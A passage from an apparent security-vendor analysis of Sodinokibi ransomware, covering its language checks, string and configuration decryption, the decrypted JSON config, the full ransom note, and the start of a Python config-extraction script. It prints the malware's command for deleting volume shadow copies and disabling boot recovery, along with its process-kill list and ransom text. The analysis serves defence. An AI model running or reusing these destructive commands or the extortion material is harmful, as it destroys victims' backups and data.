</td> <td width="146" valign="top"><p>Latvian*</p> </td> </tr><tr><td width="81" valign="top"><p><b>0x427</b></p> </td> <td width="146" valign="top"><p>Lithuanian*</p> </td> </tr><tr><td width="81" valign="top"><p><b>0x428</b></p> </td> <td width="146" valign="top"><p>Tajik</p> </td> </tr><tr><td width="81" valign="top"><p><b>0x429</b></p> </td> <td width="146" valign="top"><p>Persian*</p> </td> </tr><tr><td width="81" valign="top"><p><b>0x42B</b></p> </td> <td width="146" valign="top"><p>Armenian</p> </td> </tr><tr><td width="81" valign="top"><p><b>0x42C</b></p> </td> <td width="146" valign="top"><p>Azeri</p> </td> </tr><tr><td width="81" valign="top"><p><b>0x437</b></p> </td> <td width="146" valign="top"><p>Georgian</p> </td> </tr><tr><td width="81" valign="top"><p><b>0x43F</b></p> </td> <td width="146" valign="top"><p>Kazakh</p> </td> </tr><tr><td width="81" valign="top"><p><b>0x440</b></p> </td> <td width="146" valign="top"><p>Kygyz</p> </td> </tr><tr><td width="81" valign="top"><p><b>0x442</b></p> </td> <td width="146" valign="top"><p>Turkmen</p> </td> </tr><tr><td width="81" valign="top"><p><b>0x443</b></p> </td> <td width="146" valign="top"><p>Uzbek</p> </td> </tr><tr><td width="81" valign="top"><p><b>0x444</b></p> </td> <td width="146" valign="top"><p>Tatar</p> </td> </tr><tr><td width="81" valign="top"><p><b>0x45A</b></p> </td> <td width="146" valign="top"><p>Syrian</p> </td> </tr><tr><td width="81" valign="top"><p><b>0x2801</b></p> </td> <td width="146" valign="top"><p>Arabic (Syria)</p> </td> </tr></tbody></table> <p><i>Figure 1: Excluded languages<br>  </i><br> <sup>* <i>The malware will exit only if the keyboard layout value belongs to these countries, but the OS language value is equal to one of the remaining languages.</i></sup></p> <p>If the system language is not one of the excluded languages, Sodinokibi will terminate all processes specified by the <b>prc</b> value in the config and delete volume shadow copies before starting the file encryption routine.</p> <div style="max-width: 1100.0px; border: 1.0px solid; padding: 0.0px;"><p><br> cmd.exe /c vssadmin.exe Delete Shadows /All /Quiet &amp; bcdedit /set {default} recoveryenabled No &amp; bcdedit /set {default} bootstatuspolicy ignoreallfailures<br> </p> </div> <p><i>Figure 2: Command-line to delete volume shadow copies and disable recovery</i></p> <p>The ransomware will then proceed to encrypt all files on local drives, skipping files and folders included on the config’s exception list. Unless the executable was run with <b>-nolan</b> command line parameter, the malware will also attempt to encrypt files on network shares. <i>The file encryption routine is discussed in detail in the “File encryption” section.</i></p> <p>Each encrypted file will be renamed by adding a previously generated pseudo-random extension, which is stored in the <b>rnd_ext</b> value in the registry. A README file will be dropped in each directory and the background wallpaper will be set with a ransom message:</p> <p><img src="/content/dam/blogs-blackberry-com/images/blogs/2019/07/fig3-sodinokibi-sml.png"><i><br> Figure 3: Desktop wallpaper and README file on an infected machine</i></p> <p>The contents of the README file, as well as the ransom message, are again specified in the config.&nbsp; The key requested by the attackers is a combination of the victim’s system information and generated encryption metadata (needed to derive the decryption keys for the files), AES encrypted and base64 encoded <i>(see “File encryption” section for more details)</i>.</p> <p>Other parameters from the configuration that affect the malware’s behavior are <b>wipe</b> (if set, all the files in folders listed under <b>wfld</b> will be zeroed out and deleted) and <b>net</b> (if set, the ransomware will broadcast the victim's system information to a range of domains listed in the <b>dmn</b> value in the config).</p> <h3>String Encryption and Configuration</h3> <p>All strings are encrypted with RC4 using a random key of variable length and are decrypted on-the-fly before use. The key differs for each string and is stored prior the encrypted string in the binary:</p> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="719" valign="top">.text:00401B1D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea&nbsp;&nbsp;&nbsp;&nbsp; eax, [ebp+var_4]<br> .text:00401B20&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; out buffer<br> .text:00401B21&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp; 3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; string len<br> .text:00401B23&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; 0Eh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; RC4 key len<br> .text:00401B25&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; 923h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; RC4 key offset<br> .text:00401B2A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; offset encstr_1 ; encrypted string table<br> .text:00401B2F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp; decrypt_string&nbsp; ; &quot;exp&quot;</td> </tr></tbody></table> <p><i>Figure 4: String decryption</i></p> <p>The configuration is also RC4 encrypted and is stored together with a 32-byte decryption key, configuration checksum and length value in a randomly named section prior to the <b>.reloc</b> section in the binary:</p> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="719" valign="top">.s7bz:0041E000 ; Section 4. (virtual address 0001E000)<br> .s7bz:0041E000 ; Virtual size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : 0000C800 (&nbsp; 51200.)<br> .s7bz:0041E000 ; Section size in file&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : 0000C800 (&nbsp; 51200.)<br> .s7bz:0041E000 ; Offset to raw data for section: 0001B600<br> .s7bz:0041E000 ; Flags C0000040: Data Readable Writable<br> .s7bz:0041E000 ; Alignment&nbsp;&nbsp;&nbsp;&nbsp; : default<br> .s7bz:0041E000 ;&nbsp;<br> ===========================================================================<br> .s7bz:0041E000<br> .s7bz:0041E000 ; Segment type: Pure data<br> .s7bz:0041E000 ; Segment permissions: Read/Write<br> .s7bz:0041E000 _s7bz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; segment para public 'DATA' use32<br> .s7bz:0041E000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; assume cs:_s7bz<br> .s7bz:0041E000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;org 41E000h<br> .s7bz:0041E000 cfg_rc4key&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db 68h, 38h, 35h, 72h, 68h, 54h, 56h, 58h, 61h, 76h, 4Dh, 45h<br> .s7bz:0041E000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; DATA XREF: decrypt_config+40↑o<br> .s7bz:0041E000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db 6Ah, 58h, 4Ah, 78h, 75h, 58h, 4Dh, 35h, 50h, 70h, 4Dh, 71h<br> .s7bz:0041E000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db 42h, 4Ah, 38h, 76h, 38h, 4Dh, 4Dh, 51h<br> .s7bz:0041E020 cfg_hash&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dd 0AE445D33h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; DATA XREF: decrypt_config+17↑r<br> .s7bz:0041E024 cfg_len&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dd 25742&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; DATA XREF: decrypt_config+1↑r<br> .s7bz:0041E024&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; decrypt_config+24↑r ...<br> .s7bz:0041E028 enc_cfg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db 0B5h, 14h, 0C7h, 67h, 5Dh, 0C9h, 0EDh, 29h, 0CAh, 73h, 7Bh, 7<br> .s7bz:0041E028&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; DATA XREF: decrypt_config+7↑o<br> .s7bz:0041E028&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db 22h, 0AAh, 0E4h, 12h, 73h, 3Bh, 8Dh, 0A6h, 0C2h, 6Fh, 16h, 2Ch</td> </tr></tbody></table> <p><i>Figure 5: Encrypted configuration and RC4 key in randomly named section</i></p> <p>Once decrypted, the configuration is described using JavaScript Object Notation (JSON):</p> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="719" valign="top"><b>{<br>  </b>&nbsp; &quot;dbg&quot;<b>:</b> <b>false,<br>  </b>&nbsp; &quot;dmn&quot;<b>:</b> &quot;&quot;<b>,<br>  </b>&nbsp; &quot;exp&quot;<b>:</b> <b>true,<br>  </b>&nbsp; &quot;fast&quot;<b>:</b> <b>true,<br>  </b>&nbsp; &quot;img&quot;<b>:</b> &quot;&quot;<b>,<br>  </b>&nbsp; &quot;nbody&quot;<b>:</b> &quot;&quot;<b>,<br>  </b>&nbsp; &quot;net&quot;<b>:</b> <b>true,<br>  </b>&nbsp; &quot;nname&quot;<b>:</b> &quot;{EXT}-readme.txt&quot;<b>,<br>  </b>&nbsp; &quot;pid&quot;<b>:</b> &quot;33&quot;<b>,<br>  </b>&nbsp; &quot;pk&quot;<b>:</b> &quot;/SvNLPYVd04yhjQWFntNHZ0bsHYz2DzRIF+HjkQuTmE=&quot;<b>,<br>  </b>&nbsp; &quot;prc&quot;<b>:</b> <b>[<br>  </b>&nbsp; &nbsp; &quot;sqlagent.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;sqbcoreservice.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;mysqld_opt.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;synctime.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;excel.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;thebat64.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;onenote.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;tbirdconfig.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;powerpnt.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;xfssvccon.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;oracle.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;infopath.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;mydesktopqos.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;dbsnmp.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;sqlbrowser.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;mysqld.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;sqlservr.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;wordpad.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;thebat.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;agntsvc.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;thunderbird.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;encsvc.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;ocomm.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;winword.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;msaccess.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;dbeng50.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;firefoxconfig.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;isqlplussvc.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;ocssd.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;visio.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;mydesktopservice.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;sqlwriter.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;ocautoupds.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;mysqld_nt.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;msftesql.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;mspub.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;outlook.exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &quot;steam.exe&quot;<br> &nbsp;&nbsp;<b>],<br>  </b>&nbsp; &quot;sub&quot;<b>:</b> &quot;331&quot;<b>,<br>  </b>&nbsp; &quot;wfld&quot;<b>:</b> <b>[<br>  </b>&nbsp; &nbsp; &quot;backup&quot;<br> &nbsp;&nbsp;<b>],<br>  </b>&nbsp; &quot;wht&quot;<b>:</b> <b>{<br>  </b>&nbsp; &nbsp; &quot;ext&quot;<b>:</b> <b>[<br>  </b>&nbsp; &nbsp; &nbsp; &quot;shs&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;bin&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;msp&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;hta&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;mod&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;wpx&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;msi&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;sys&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;ics&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;cmd&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;rtp&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;nomedia&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;scr&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;cur&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;prf&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;msu&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;nls&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;icl&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;ps1&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;bat&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;lnk&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;theme&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;adv&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;deskthemepack&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;diagcab&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;msc&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;lock&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;key&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;ocx&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;hlp&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;msstyles&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;mpa&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;diagcfg&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;icns&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;rom&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;dll&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;com&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;idx&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;cab&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;exe&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;spl&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;drv&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;themepack&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;diagpkg&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;ani&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;386&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;ico&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;ldf&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;cpl&quot;<br> &nbsp; &nbsp;&nbsp;<b>],<br>  </b>&nbsp; &nbsp; &quot;fld&quot;<b>:</b> <b>[<br>  </b>&nbsp; &nbsp; &nbsp; &quot;boot&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;msocache&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;programdata&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;$windows.~ws&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;tor browser&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;program files (x86)&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;$recycle.bin&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;google&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;$windows.~bt&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;intel&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;windows&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;windows.old&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;mozilla&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;system volume information&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;perflogs&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;application data&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;appdata&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;program files&quot;<br> &nbsp; &nbsp;&nbsp;<b>],<br>  </b>&nbsp; &nbsp; &quot;fls&quot;<b>:</b> <b>[<br>  </b>&nbsp; &nbsp; &nbsp; &quot;desktop.ini&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;autorun.inf&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;ntldr&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;bootsect.bak&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;ntuser.dat&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;boot.ini&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;thumbs.db&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;bootfont.bin&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;ntuser.dat.log&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;iconcache.db&quot;<b>,<br>  </b>&nbsp; &nbsp; &nbsp; &quot;ntuser.ini&quot;<br> &nbsp; &nbsp;&nbsp;<b>]<br>  </b>&nbsp;&nbsp;<b>},<br>  </b>&nbsp; &quot;wipe&quot;<b>:</b> <b>true<br>  }</b></td> </tr></tbody></table> <p><i>Figure 6: JSON configuration file</i></p> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="719" valign="top"><p><br> All of your files are encrypted!</p> <p>Find {EXT}-readme.txt and follow instructions</p> </td> </tr></tbody></table> <p><i>Figure 7: Base64 decoded img value from the configuration</i></p> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="719" valign="top"><p>---=== Welcome. Again. ===---</p> <p>[+] Whats Happen? [+]</p> <p>Your files are encrypted, and currently unavailable. You can check it: all files on you computer has expansion {EXT}.<br> By the way, everything is possible to recover (restore), but you need to follow our instructions. Otherwise, you cant return your data (NEVER).</p> <p>[+] What guarantees? [+]</p> <p>Its just a business. We absolutely do not care about you and your deals, except getting benefits. If we do not do our work and liabilities - nobody will not cooperate with us. Its not in our interests.<br> To check the ability of returning files, You should go to our website. There you can decrypt one file for free. That is our guarantee.<br> If you will not cooperate with our service - for us, its does not matter. But you will lose your time and data, cause just we have the private key. In practise - time is much more valuable than money.</p> <p>[+] How to get access on website? [+]</p> <p>You have two ways:<br> </p> <p>1) [Recommended] Using a TOR browser!<br> &nbsp; a) Download and install TOR browser from this site: https://torproject.org/<br> &nbsp; b) Open our website: hxxxp:// aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd [dot] onion/{UID}</p> <p>2) If TOR blocked in your country, try to use VPN! But you can use our secondary website. For this:<br> </p> <p>&nbsp; a) Open your any browser (Chrome, Firefox, Opera, IE, Edge)<br> &nbsp; b) Open our secondary website: hxxxp:// decryptor [dot] top/{UID}</p> <p>Warning: secondary website can be blocked, thats why first variant much better and more available.</p> <p>When you open our website, put the following data in the input form:<br> Key:</p> <p>{KEY}<br> </p> <p>Extension name:</p> <p>{EXT}</p> <p>-----------------------------------------------------------------------------------------</p> <p>!!! DANGER !!!<br> DONT try to change files by yourself, DONT use any third party software for restoring your data or antivirus solutions - its may entail damge of the private key and, as result, The Loss all data.<br> !!! !!! !!!</p> <p>ONE MORE TIME: Its in your interests to get your files back. From our side, we (the best specialists) make everything for restoring, but please should not interfere.<br> !!! !!! !!!</p> </td> </tr></tbody></table> <p><i>Figure 8: Base64 decoded nbody value from the configuration</i></p> <table border="1" cellspacing="0" cellpadding="0" width="718"> <tbody><tr><td width="79" valign="top" bgcolor="#ECECEC"><p><b>Key</b></p> </td> <td width="151" valign="top" bgcolor="#ECECEC"><p><b>Type</b></p> </td> <td width="488" valign="top" bgcolor="#ECECEC"><p><b>Description</b></p> </td> </tr><tr><td width="79"><p><b>prc</b></p> </td> <td width="151" valign="top"><p>Array of strings</p> </td> <td width="488" valign="top"><p>Process names to terminate</p> </td> </tr><tr><td width="79"><p><b>dmn</b></p> </td> <td width="151" valign="top"><p>String</p> </td> <td width="488" valign="top"><p>Semi-colon separated list of domain names</p> </td> </tr><tr><td width="79"><p><b>img</b></p> </td> <td width="151" valign="top"><p>String (Base64 encoded)</p> </td> <td width="488" valign="top"><p>Message to display on desktop wallpaper</p> </td> </tr><tr><td width="79"><p><b>pid</b></p> </td> <td width="151" valign="top"><p>String (Integer)</p> </td> <td width="488" valign="top"><p>Actor ID</p> </td> </tr><tr><td width="79"><p><b>sub</b></p> </td> <td width="151" valign="top"><p>String (Integer)</p> </td> <td width="488" valign="top"><p>Campaign ID</p> </td> </tr><tr><td width="79"><p><b>fast</b></p> </td> <td width="151" valign="top"><p>Boolean</p> </td> <td width="488" valign="top"><p>Enable fast mode (encrypt only the first 1 MB of each file)</p> </td> </tr><tr><td width="79"><p><b>wfld</b></p> </td> <td width="151" valign="top"><p>Array of strings</p> </td> <td width="488" valign="top"><p>Folders to wipe</p> </td> </tr><tr><td width="79"><p><b>wht</b></p> </td> <td width="151" valign="top"><p>Object</p> </td> <td width="488" valign="top"><p>Whitelist</p> </td> </tr><tr><td width="79"><p><b>wht.fld</b></p> </td> <td width="151" valign="top"><p>Array of strings</p> </td> <td width="488" valign="top"><p>Folders to whitelist from encryption</p> </td> </tr><tr><td width="79"><p><b>wht.fls</b></p> </td> <td width="151" valign="top"><p>Array of strings</p> </td> <td width="488" valign="top"><p>Files to whitelist from encryption</p> </td> </tr><tr><td width="79"><p><b>wht.ext</b></p> </td> <td width="151" valign="top"><p>Array of strings</p> </td> <td width="488" valign="top"><p>File extensions to whitelist from encryption</p> </td> </tr><tr><td width="79"><p><b>dbg</b></p> </td> <td width="151" valign="top"><p>Boolean</p> </td> <td width="488" valign="top"><p>Debug mode. If set, don't check for keyboard layout</p> </td> </tr><tr><td width="79"><p><b>exp</b></p> </td> <td width="151" valign="top"><p>Boolean</p> </td> <td width="488" valign="top"><p>Enable privilege escalation “exploit” (CVE-2018-8453)</p> </td> </tr><tr><td width="79"><p><b>pk</b></p> </td> <td width="151" valign="top"><p>String (Base64 encoded)</p> </td> <td width="488" valign="top"><p>Attacker’s public encryption key (256-bit)</p> </td> </tr><tr><td width="79"><p><b>net</b></p> </td> <td width="151" valign="top"><p>Boolean</p> </td> <td width="488" valign="top"><p>Send HTTP POST request to domains</p> </td> </tr><tr><td width="79"><p><b>wipe</b></p> </td> <td width="151" valign="top"><p>Boolean</p> </td> <td width="488" valign="top"><p>If true, then wipe files in specified folders</p> </td> </tr><tr><td width="79"><p><b>nname</b></p> </td> <td width="151" valign="top"><p>String (Base64 encoded)</p> </td> <td width="488" valign="top"><p>Readme filename</p> </td> </tr><tr><td width="79" valign="bottom"><p><b>nbody</b></p> </td> <td width="151" valign="top"><p>String (Base64 encoded)</p> </td> <td width="488" valign="top"><p>Readme file contents</p> </td> </tr></tbody></table> <p><i>Figure 9: Configuration field details</i></p> <p>We wrote a configuration decoder that should work with the currently known versions of Sodinokibi. The script requires Python <b>scandir </b>and <b>pefile </b>modules:</p> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="719" valign="top"><p>&quot;&quot;&quot;Extract Sodinokibi ransomware configuration from a given exe/folder of exes&quot;&quot;&quot;<br> <b>import</b> os<br> <b>import</b> sys<br> <b>import</b> scandir<br> <br> <b>import</b> pefile<br> <b>import</b> string<br> <b>import</b> struct<br> <b>import</b> json<br> <b><br>  def</b> rc4<b>(</b>key<b>,</b> enc_data<b>):<br>  </b>&nbsp; &nbsp; dec <b>=</b> &quot;&quot;<br> &nbsp; &nbsp; enc <b>=</b> <b>[]<br>  </b>&nbsp; &nbsp; enclen <b>=</b> len<b>(</b>enc_data<b>)</b></p> <p>&nbsp; &nbsp; keylen <b>=</b> len<b>(</b>key<b>)<br>  </b>&nbsp; &nbsp; rc4key <b>=</b> <b>[</b>ord<b>(</b>c<b>)</b> <b>for</b> c <b>in</b> key<b>]<br>  </b>&nbsp; &nbsp;&nbsp;<b>for</b> i <b>in</b> range<b>(</b>enclen<b>):<br>  </b>&nbsp; &nbsp; &nbsp; &nbsp; enc<b>.</b>append<b>(</b>ord<b>(</b>enc_data<b>[</b>i<b>]))</b></p> 